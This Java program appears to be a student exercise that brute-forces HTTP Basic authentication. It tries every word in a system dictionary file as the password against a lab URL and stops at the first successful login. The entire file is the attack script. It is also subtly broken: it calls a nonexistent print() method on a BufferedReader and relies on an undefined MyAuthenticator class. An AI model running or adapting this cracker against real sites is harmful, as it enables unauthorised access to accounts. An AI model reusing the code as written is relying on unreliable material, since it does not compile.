

import java.text.*;  
import java.util.*;  
import java.net.*;  
import java.io.*;  

public class Dictionary {  

   public int runProcess(String urlString,String passwd) {  

       System.out.println("Checking password: ... " + passwd);

       int returnval = 0;
       MyAuthenticator auth = new MyAuthenticator(passwd);
       Authenticator.setDefault(auth);

       try{

            URL yahoo = new URL(urlString); 
            BufferedReader in = new BufferedReader(new InputStreamReader(yahoo.openStream()));
            String inputLine;

            while ((inputLine = in.readLine()) != null) {
	       System.out.println(inputLine);
	       System.out.println("password: " + passwd);
               returnval = 1;
            }

	    in.print();

          }catch(Exception e){ returnval = 0;}

       return returnval;
   }

   public static void main (String argv[]) {  

      int retval = 0;
      String pwd = "";
      String inFile = "/usr/share/lib/dict/words";
      BufferedReader in = null;
      String line1 ="";

      try {
      
        Dictionary s = new Dictionary();  
        String urlToSearch = "http://sec-crack.cs.rmit.edu./SEC/2/";  
        in = new BufferedReader(new FileReader(inFile));   

        while ((line1=in.readLine()) != null) {

          retval = 0;
          pwd = line1;
          retval = s.runProcess(urlToSearch,pwd);  
          if (retval > 0) {
             System.exit(0);
          }
        }
      }catch(Exception e)
          { e.printStackTrace();}
    
    }  
}     
